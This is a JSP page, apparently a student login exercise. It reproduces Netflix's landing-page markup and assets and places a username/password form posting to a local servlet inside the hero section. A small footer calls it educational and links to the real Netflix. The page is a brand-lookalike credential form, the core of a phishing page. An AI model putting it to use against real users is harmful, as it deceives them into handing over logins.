<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>

<html>
<head>
    <title>Netflix - Login</title>
    <%--        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins">--%>
    <link type="text/css" rel="stylesheet" href="https://assets.nflxext.com/web/ffe/wp/less/signup/nmhp/nmhp.fb04176fa95ed708b84f.css" data-uia="botLink" />
</head>
<%--    <style>--%>
<%--        body {--%>
<%--            font-family: "Poppins", serif;--%>
<%--            display: flex;--%>
<%--            flex-direction: column;--%>
<%--            justify-content: center;--%>
<%--            align-items: center;--%>
<%--        }--%>
<%--    </style>--%>
<body>

<%-- BEGIN NETFLIX SOURCE CODE --%>
<div id="appMountPoint">
    <div class="basicLayout">
        <div class="netflix-sans-font-loaded">
            <div class="our-story-desktop-framework adsplan-banner-enabled">
                <div>
                    <div class="our-story-container" dir="ltr">
                        <div class="mobile-plan-banner -container">
                            <div class="badging-indicator">New!</div>
                            <div class="mobile-plan-banner -banner-offer-text" data-uia=""><span>Plans now start at <span class="mobile-plan-banner -price-label">$6.99</span>.</span>
                            </div>
                        </div>
                    </div>
                    <div class="our-story-cards" data-uia-nmhp="our-story-cards">
                        <div class="our-story-card hero-card hero_fuji vlv" data-uia-nmhp="hero_fuji" data-uia="our-story-card">
                            <div class="our-story-card-background">
                                <div class="concord-img-wrapper" data-uia="concord-img-wrapper"><img class="concord-img vlv-creative" src="https://assets.nflxext.com/ffe/siteui/vlv3/0ef67cc5-0aa7-47cf-87bd-7f595afc7cfb/728618d9-9274-46ab-9850-1015ff9c05df/US-en-20221107-popsignuptwoweeks-perspective_alpha_website_small.jpg" srcSet="https://assets.nflxext.com/ffe/siteui/vlv3/0ef67cc5-0aa7-47cf-87bd-7f595afc7cfb/728618d9-9274-46ab-9850-1015ff9c05df/US-en-20221107-popsignuptwoweeks-perspective_alpha_website_small.jpg 1000w, https://assets.nflxext.com/ffe/siteui/vlv3/0ef67cc5-0aa7-47cf-87bd-7f595afc7cfb/728618d9-9274-46ab-9850-1015ff9c05df/US-en-20221107-popsignuptwoweeks-perspective_alpha_website_medium.jpg 1500w, https://assets.nflxext.com/ffe/siteui/vlv3/0ef67cc5-0aa7-47cf-87bd-7f595afc7cfb/728618d9-9274-46ab-9850-1015ff9c05df/US-en-20221107-popsignuptwoweeks-perspective_alpha_website_large.jpg 1800w" alt="" />
                                    <div class="concord-img-gradient"></div>
                                </div>
                            </div>
                            <div class="our-story-card-text">
                                <h1 class="our-story-card-title" data-uia="hero-title">Unlimited movies, TV shows, and more.</h1>
                                <h2 class="our-story-card-subtitle" data-uia="our-story-card-subtitle">Watch anywhere. Cancel anytime.</h2>



                                <%-- END NETFLIX SOURCE CODE--%>
                                <form method="POST" action="netflix-servlet">
                                    <label for="username">Username</label>
                                    <input type="text" id="username" name="username">
                                    <br>
                                    <label for="password">Password</label>
                                    <input type="password" id="password" name="password">
                                    <br>
                                    <button name="login" value="processLogin" type="submit">Login</button>
                                </form>



                                <%-- BEGIN NETFLIX SOURCE CODE--%>
                            </div>
                            <div class="center-pixel" style="position:absolute"></div>
                        </div>
                        <div class="our-story-card animation-card watchOnTv" data-uia-nmhp="watchOnTv" data-uia="our-story-card">
                            <div class="animation-card-container">
                                <div class="our-story-card-text">
                                    <h1 class="our-story-card-title" data-uia="animation-card-title">Enjoy on your TV.</h1>
                                    <h2 class="our-story-card-subtitle" data-uia="our-story-card-subtitle">Watch on Smart TVs, Playstation, Xbox, Chromecast, Apple TV, Blu-ray players, and more.</h2>
                                </div>
                                <div class="our-story-card-img-container">
                                    <div class="our-story-card-animation-container"><img alt="" class="our-story-card-img" src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/tv.png" data-uia="our-story-card-img" />
                                        <div class="our-story-card-animation" data-uia="our-story-card-animation"><video class="our-story-card-video" data-uia="our-story-card-video" autoplay="" playsinline="" muted="" loop=""><source src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-tv-0819.m4v" type="video/mp4"/></video>
                                            <div class="our-story-card-animation-text"></div>
                                            <div class="our-story-card-animation-custom" data-uia="our-story-card-custom" aria-hidden="true"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="center-pixel" style="position:absolute"></div>
                            </div>
                        </div>
                        <div class="our-story-card animation-card watchOnDevice flipped" data-uia-nmhp="watchOnDevice" data-uia="our-story-card">
                            <div class="animation-card-container">
                                <div class="our-story-card-text">
                                    <h1 class="our-story-card-title" data-uia="animation-card-title">Watch everywhere.</h1>
                                    <h2 class="our-story-card-subtitle" data-uia="our-story-card-subtitle">Stream unlimited movies and TV shows on your phone, tablet, laptop, and TV without paying more.</h2>
                                </div>
                                <div class="our-story-card-img-container">
                                    <div class="our-story-card-animation-container"><img alt="" class="our-story-card-img" src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/device-pile.png" data-uia="our-story-card-img" />
                                        <div class="our-story-card-animation" data-uia="our-story-card-animation"><video class="our-story-card-video" data-uia="our-story-card-video" autoplay="" playsinline="" muted="" loop=""><source src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/video-devices.m4v" type="video/mp4"/></video>
                                            <div class="our-story-card-animation-text"></div>
                                            <div class="our-story-card-animation-custom" data-uia="our-story-card-custom" aria-hidden="true"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="center-pixel" style="position:absolute"></div>
                            </div>
                        </div>
                        <div class="our-story-card animation-card kidsValueProp" data-uia-nmhp="kidsValueProp" data-uia="our-story-card">
                            <div class="animation-card-container">
                                <div class="our-story-card-text">
                                    <h1 class="our-story-card-title" data-uia="animation-card-title">Create profiles for kids.</h1>
                                    <h2 class="our-story-card-subtitle" data-uia="our-story-card-subtitle">Send kids on adventures with their favorite characters in a space made just for them—free with your membership.</h2>
                                </div>
                                <div class="our-story-card-img-container">
                                    <div class="our-story-card-animation-container"><img alt="" class="our-story-card-img" src="https://occ-0-2074-768.1.nflxso.net/dnm/api/v6/19OhWN2dO19C9txTON9tvTFtefw/AAAABfpnX3dbgjZ-Je8Ax3xn0kXehZm_5L6-xe6YSTq_ucht9TI5jwDMqusWZKNYT8DfGudD0_wWVVTFLiN2_kaQJumz2iivUWbIbAtF.png?r=11f" data-uia="our-story-card-img" />
                                        <div class="our-story-card-animation" data-uia="our-story-card-animation">
                                            <div class="our-story-card-animation-text"></div>
                                            <div class="our-story-card-animation-custom" data-uia="our-story-card-custom" aria-hidden="true"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="center-pixel" style="position:absolute"></div>
                            </div>
                        </div>
                        <div class="our-story-card animation-card downloadAndWatch flipped" data-uia-nmhp="downloadAndWatch" data-uia="our-story-card">
                            <div class="animation-card-container">
                                <div class="our-story-card-text">
                                    <h1 class="our-story-card-title" data-uia="animation-card-title">Download your shows to watch offline.</h1>
                                    <h2 class="our-story-card-subtitle" data-uia="our-story-card-subtitle">Available on all plans except Basic with ads.</h2>
                                </div>
                                <div class="our-story-card-img-container">
                                    <div class="our-story-card-animation-container"><img alt="" class="our-story-card-img" src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/mobile-0819.jpg" data-uia="our-story-card-img" />
                                        <div class="our-story-card-animation" data-uia="our-story-card-animation">
                                            <div class="our-story-card-animation-image"><img alt="" src="https://assets.nflxext.com/ffe/siteui/acquisition/ourStory/fuji/desktop/boxshot.png" /></div>
                                            <div class="our-story-card-animation-text">
                                                <div class="text-0" data-uia="">Stranger Things</div>
                                                <div class="text-1" data-uia="">Downloading...</div>
                                            </div>
                                            <div class="our-story-card-animation-custom" data-uia="our-story-card-custom" aria-hidden="true"></div>
                                        </div>
                                    </div>
                                </div>
                                <div class="center-pixel" style="position:absolute"></div>
                            </div>
                        </div>
                    </div>
                    <div class="our-story-card card-contents footer-card our-story-card-no-border" style="position:relative" data-uia-nmhp="footer" data-uia="our-story-card">
                        <div class="site-footer-wrapper centered dark">
                            <div class="footer-divider"></div>
                            <div class="site-footer">
                                <p class="footer-top">Netflix, this is for educational purposes, don't sue me plz. <a class="footer-top-a" href="https://www.netflix.com/"><br>Click for real Netflix.</a></p>
                            </div>
                        </div>
                        <div class="center-pixel" style="position:absolute"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<%--    &lt;%&ndash; END NETFLIX SOURCE CODE&ndash;%&gt;--%>
<%--    <h2>Hello, please sign in:</h2>--%>
<%--        <form method="POST" action="netflix-servlet">--%>
<%--            <label for="username">Username</label>--%>
<%--                <input type="text" id="username" name="username">--%>
<%--            <br>--%>
<%--            <label for="password">Password</label>--%>
<%--                <input type="password" id="password" name="password">--%>
<%--            <br>--%>
<%--            <button name="login" value="processLogin" type="submit">Login</button>--%>
<%--        </form>--%>
</body>
</html>